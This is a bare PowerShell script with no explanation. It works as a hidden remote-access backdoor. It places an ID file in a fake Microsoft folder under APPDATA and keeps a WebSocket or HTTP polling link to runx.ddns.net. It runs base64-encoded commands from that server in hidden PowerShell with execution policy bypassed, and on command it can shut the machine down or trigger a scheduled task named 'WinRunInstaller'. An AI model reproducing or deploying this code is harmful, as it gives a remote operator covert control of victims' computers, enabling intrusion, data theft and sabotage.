$m1 = New-Object System.Threading.Mutex($false, "run.exe")
if (-not $m1.WaitOne(0)) {
	exit
}

$m2 = New-Object System.Threading.Mutex($false, "run.ps1")
if (-not $m2.WaitOne(0)) {
	exit
}

$VPS_WS_URL = "ws://runx.ddns.net/ws/client"
$VPS_POLL_URL = "http://runx.ddns.net/api/poll"
$IdPath = "$env:APPDATA\Microsoft\run\run.txt"

if (Test-Path $IdPath) {
	$raw = (Get-Content $IdPath -Raw).Trim()
	if ($raw.Length -ge 8) {
		$uniqueId = $raw.Substring(0, 8)
	}
	else {
		$uniqueId = $raw
	}
}
else {
	$uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
	Set-Content -Path $IdPath -Value $uniqueId
}

$uniqueUser = "$($env:USERNAME)-$uniqueId-W"
$SCRIPT_VERSION = "8417ed1"
$clientVersion = $SCRIPT_VERSION




function Execute-CommandPayload ($r) {
	if ($r.run -eq $true -and -not [string]::IsNullOrEmpty($r.cmd)) {
		$c = [System.Text.Encoding]::UTF8.GetString(
			[System.Convert]::FromBase64String($r.cmd)
		)

		if ($c -match "panic") {
			exit
		}
		elseif ($c -match "altf4") {
			Start-Process `
				-FilePath "shutdown" `
				-ArgumentList "/s", "/t", "0" `
				-WindowStyle Hidden
		}
		elseif ($c -match "sauce") {
			Start-ScheduledTask `
				-TaskName "WinRunInstaller"
		}
		else {
			$style = if ($r.visible -eq $true) {
				"Normal"
			}
			else {
				"Hidden"
			}

			Start-Process powershell.exe `
				-ArgumentList @(
				"-NoProfile",
				"-ExecutionPolicy",
				"Bypass",
				"-Command",
				$c
			) -WindowStyle $style
		}
	}
}

try {
	while ($true) {
		try {
			$wsUri = "$VPS_WS_URL?username=" + [System.Uri]::EscapeDataString($uniqueUser) + "&version=" + [System.Uri]::EscapeDataString($clientVersion)
			$ws = New-Object System.Net.WebSockets.ClientWebSocket
			$cts = New-Object System.Threading.CancellationTokenSource
			$cts.CancelAfter(10000)

			$ws.ConnectAsync((New-Object System.Uri($wsUri)), $cts.Token).Wait()

			if ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
				$buffer = [System.ArraySegment[byte]]::new((New-Object byte[] 8192))
				$lastPing = [DateTime]::UtcNow

				while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
					if (([DateTime]::UtcNow - $lastPing).TotalSeconds -ge 15) {
						$pingObj = @{ type = "ping"; version = $clientVersion } | ConvertTo-Json -Compress
						$pingBytes = [System.Text.Encoding]::UTF8.GetBytes($pingObj)
						$pingSeg = [System.ArraySegment[byte]]::new($pingBytes)
						$ws.SendAsync($pingSeg, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
						$lastPing = [DateTime]::UtcNow
					}

					$ms = New-Object System.IO.MemoryStream
					do {
						$receiveTask = $ws.ReceiveAsync($buffer, [System.Threading.CancellationToken]::None)
						if (-not $receiveTask.Wait(3000)) {
							break
						}
						$result = $receiveTask.Result
						if ($result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
							$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "", [System.Threading.CancellationToken]::None).Wait()
							break
						}
						if ($result.Count -gt 0) {
							$ms.Write($buffer.Array, $buffer.Offset, $result.Count)
						}
					} while (-not $result.EndOfMessage)

					if ($ms.Length -gt 0) {
						$jsonStr = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
						$r = $jsonStr | ConvertFrom-Json
						Execute-CommandPayload $r
					}
				}
			}
		}
		catch {
			try {
				$u = $VPS_POLL_URL + "?username=" + [System.Uri]::EscapeDataString($uniqueUser) + "&version=" + [System.Uri]::EscapeDataString($clientVersion)
				$r = Invoke-RestMethod -Method Get -Uri (New-Object System.Uri($u)) -TimeoutSec 5
				Execute-CommandPayload $r
			}
			catch {}
		}
		Start-Sleep -Seconds 2
	}

}
finally {
	if ($m1) {
		$m1.ReleaseMutex()
		$m1.Dispose()
	}

	if ($m2) {
		$m2.ReleaseMutex()
		$m2.Dispose()
	}
}

